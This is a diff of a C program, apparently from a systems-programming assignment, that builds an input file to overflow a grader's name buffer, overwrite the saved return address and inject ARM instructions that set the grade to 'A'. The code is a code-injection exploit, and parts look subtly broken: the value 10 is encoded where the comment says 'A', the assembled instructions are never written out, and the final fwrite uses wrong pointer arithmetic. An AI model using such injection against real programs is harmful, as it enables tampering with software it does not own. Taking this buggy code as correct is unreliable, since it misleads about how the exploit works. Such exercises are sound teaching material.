@@ -8,6 +8,7 @@
 /*--------------------------------------------------------------------*/
 
 #include <stdio.h>
+#include "miniassembler.c"
 
 int main(void){
    FILE *psFile;
@@ -17,31 +18,32 @@ int main(void){
    int i;
 
    psFile = fopen("dataA", "w");
+
+   /* Writes the new x30 for getName to skip to our assembly */
+   pAAttack = 0x420058;
    
    /* Writes the student's names */
    ulData = 0x00006E655678614D;
    fwrite(&ulData, sizeof(unsigned long), 1, psFile);
 
    /* mov w0, 'A'   */
-   ulInstruction = 0;
+   ulInstruction = MiniAssembler_mov(0, 10);
 
    /* adr x1, grade */
-
+   ulInstruction = MiniAssembler_adr(1, 0x420044, pAAttack + 8 + 4);
 
    /* strb wo, [x1] */
-
+   ulInstruction = MiniAssembler_strb(0, 1);
 
    /* b  printf     */
-
+   ulInstruction = MiniAssembler_b(0x40089c, pAAttack + 8 + 12);
 
 
    /* Writes the null byte at the end of the instructions */
    for (i = 0; i < 24; i++)
       putc(0x00, psFile); /* Writes '00000000' */
 
-   /* Writes the new x30 for getName to skip to our assembly */
-   pAAttack = 0x420058;
-   fwrite(&pAAttack, sizeof(unsigned long), 1, psFile);
+   fwrite(&pAAttack + 8, sizeof(unsigned long), 1, psFile);
 
    fclose(psFile);
 
